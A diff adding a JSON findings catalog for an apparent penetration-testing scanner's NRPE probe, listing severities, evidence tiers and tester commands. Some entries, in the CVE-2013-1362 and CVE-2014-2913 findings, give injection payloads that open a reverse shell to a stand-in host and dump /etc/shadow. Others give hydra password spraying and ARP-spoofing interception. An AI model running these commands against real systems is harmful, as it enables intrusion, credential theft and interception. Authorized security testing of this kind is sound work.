@@ -1,0 +1,189 @@
+{
+  "service": "nrpe",
+  "summary": "Deep NRPE probe. Reachability + protocol facts (plaintext, anon-DH TLS, CRC32 integrity, version, cert extraction) are T1. Command enumeration + user/hostname/OS harvesting from real check output push into T2 (controlled queries extract real data). The two RCE probes (CVE-2013-1362 arg-injection and CVE-2014-2913 LF metachar bypass) are proper T2 \u2014 send a controlled marker, verify it echoed back through a shell context. Gated behind active_rce. Missing: no follow-on to a shell/creds capture, no PSK/pre-shared key discovery. cve_2020_6581_version is version-only.",
+  "module_files": [
+    "recce/services/nrpe.py",
+    "recce/core/known_monitoring_agents.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hostnames",
+    "known_hosts_os"
+  ],
+  "findings": [
+    {
+      "kind": "nrpe_reachable",
+      "title_pattern": "NRPE agent reachable",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "_NRPE_CHECK reply parsed \u2014 proof allowed_hosts admits the scanner (no auth in base protocol).",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Baseline \u2014 depth is in the companion findings.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c _NRPE_CHECK"
+    },
+    {
+      "kind": "nrpe_version_disclosed",
+      "title_pattern": "NRPE version disclosed",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Version parsed from banner via _VERSION_RE.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Enum-only; drives cve_2020_6581 gate.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c _NRPE_CHECK \u2014 note version."
+    },
+    {
+      "kind": "nrpe_plaintext_traffic",
+      "title_pattern": "NRPE traffic in the clear (no TLS)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Plaintext v2 exchange succeeded \u2014 deterministic.",
+      "can_promote_to": "t2",
+      "promotion_risk": "high",
+      "promotion_notes": "T2 = on-path capture of command output (user lists, process argv), verified via replay. Requires L2 access.",
+      "tester_next_step": "tcpdump -i any -w nrpe.pcap 'tcp port 5666'; replay captured queries to correlate with legitimate check output."
+    },
+    {
+      "kind": "nrpe_no_message_auth",
+      "title_pattern": "NRPE v2 packet integrity is CRC32 only",
+      "severity": "low",
+      "tier": "t0",
+      "tier_evidence": "Implicit from v2 speaking \u2014 no MAC in the protocol.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Protocol-level fact; no probe promotion available.",
+      "tester_next_step": "Note the protocol-integrity gap for the customer report; combine with plaintext for on-path recommendation."
+    },
+    {
+      "kind": "nrpe_anon_dh_tls",
+      "title_pattern": "NRPE TLS uses anonymous Diffie-Hellman (no server auth)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "TLS handshake succeeded with cipher name starting 'ADH' \u2014 deterministic.",
+      "can_promote_to": "t2",
+      "promotion_risk": "high",
+      "promotion_notes": "T2 = MITM the anon-DH session (bettercap/mitmproxy) since server auth is absent. Requires L2.",
+      "tester_next_step": "openssl s_client -cipher ADH-AES256-SHA -connect <ip>:5666 \u2014 confirm; then bettercap arp.spoof + intercept."
+    },
+    {
+      "kind": "nrpe_tls_cert_extracted",
+      "title_pattern": "NRPE TLS certificate identity extracted",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "CN/SANs regex-mined from DER \u2014 enrichment only.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Feeds known_hostnames; already extraction-tier.",
+      "tester_next_step": "openssl s_client -showcerts -connect <ip>:5666 \u2014 cross-reference CN/SANs with other TLS surfaces."
+    },
+    {
+      "kind": "nrpe_allowed_hosts_permissive",
+      "title_pattern": "NRPE allowed_hosts likely permissive",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Any reply from scanner IP is deterministic evidence allowed_hosts admits it.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Precondition; downstream findings carry exploitation.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c _NRPE_CHECK \u2014 then run the CVE-2013-1362 arg-injection probe."
+    },
+    {
+      "kind": "nrpe_command_surface",
+      "title_pattern": "NRPE command surface enumerated",
+      "severity": "medium",
+      "tier": "t2",
+      "tier_evidence": "Actually invokes each check_ command and records its output \u2014 controlled queries returning real data.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 = attempt $ARG$ substitution on every enumerated command (not just the first) to widen the CVE-2013-1362 surface; some check_ commands take -a and are vulnerable while others aren't.",
+      "tester_next_step": "for c in check_load check_disk check_procs check_users; do check_nrpe -H <ip> -p 5666 -c $c -a 'x$(id)y'; done \u2014 grep for uid= in reply."
+    },
+    {
+      "kind": "nrpe_implied_local_services",
+      "title_pattern": "NRPE implies additional local services",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "Presence of check_mysql/check_pgsql/etc implies the service \u2014 inference, not a live confirmation.",
+      "can_promote_to": "t2",
+      "promotion_risk": "low",
+      "promotion_notes": "T2 = invoke the check_ command to actually confirm the local service state (check_mysql returns 'Connection refused' vs 'Access denied for user') \u2014 turns inference into confirmation + version.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c check_mysql \u2014 parse for MySQL version/access-denied to confirm localhost:3306 is live."
+    },
+    {
+      "kind": "nrpe_userlist_extracted",
+      "title_pattern": "NRPE leaked logged-in / process users",
+      "severity": "medium",
+      "tier": "t2",
+      "tier_evidence": "check_users/check_procs output parsed and real usernames captured.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 = spray captured usernames against SSH/SMB/LDAP/RDP with a small wordlist; folds into cross-service known_users which the sprayers already consume.",
+      "tester_next_step": "hydra -L nrpe_users.txt -P rockyou-top100.txt -t 4 -f ssh://<ip>; also ldap/smb spray."
+    },
+    {
+      "kind": "nrpe_hostname_extracted",
+      "title_pattern": "NRPE disclosed hostname / FQDN",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Regex-parsed from check output.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Feeds known_hostnames.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c check_hostname \u2014 feed to Kerberos-realm inference."
+    },
+    {
+      "kind": "nrpe_os_fingerprint",
+      "title_pattern": "NRPE plugin path fingerprints OS",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Plugin-path prefix classification \u2014 inference only.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Enum-only.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c __recce_nonexistent \u2014 plugin path in error localizes distro."
+    },
+    {
+      "kind": "nrpe_cve_2020_6581_version",
+      "title_pattern": "NRPE version < 3.2.1 \u2014 client-side OOB read (CVE-2020-6581)",
+      "severity": "low",
+      "tier": "t0",
+      "tier_evidence": "Version compare only; module explicitly does not trigger.",
+      "can_promote_to": "stay",
+      "promotion_risk": "destructive",
+      "promotion_notes": "PoC would crash the monitoring-server-side check_nrpe (client-side); not worth automating.",
+      "tester_next_step": "Note version; recommend upgrade. No safe automated PoC.",
+      "related_cves": [
+        "CVE-2020-6581"
+      ]
+    },
+    {
+      "kind": "nrpe_arg_injection_rce",
+      "title_pattern": "NRPE argument injection RCE (CVE-2013-1362)",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "Marker RECCE_NRPE_RCE appeared in the reply \u2014 proof shell metacharacter substitution into exec context. Gated behind active_rce.",
+      "can_promote_to": "t3",
+      "promotion_risk": "medium",
+      "promotion_notes": "T3 = reverse shell via bash -i >& /dev/tcp/\u2026, then id/uname/dump ~/.ssh. Documented as tester_next_step per user directive.",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c check_users -a 'x$(bash -i >& /dev/tcp/<lhost>/4444 0>&1)y'; also `-a 'x$(cat /etc/shadow)y'` for shadow dump.",
+      "related_cves": [
+        "CVE-2013-1362"
+      ]
+    },
+    {
+      "kind": "nrpe_metachar_bypass_rce",
+      "title_pattern": "NRPE metachar-bypass RCE via LF (CVE-2014-2913)",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "LF-only marker echoed back \u2014 proves incomplete 2013 patch, shell exec confirmed. Gated behind active_rce.",
+      "can_promote_to": "t3",
+      "promotion_risk": "medium",
+      "promotion_notes": "Same T3 promotion path as arg_injection_rce \u2014 LF variant works where the ; sanitizer blocked $(\u2026).",
+      "tester_next_step": "check_nrpe -H <ip> -p 5666 -c check_users -a $'x\\n bash -i >& /dev/tcp/<lhost>/4444 0>&1'; grep uid= in reply for confirmation.",
+      "related_cves": [
+        "CVE-2014-2913"
+      ]
+    }
+  ]
+}
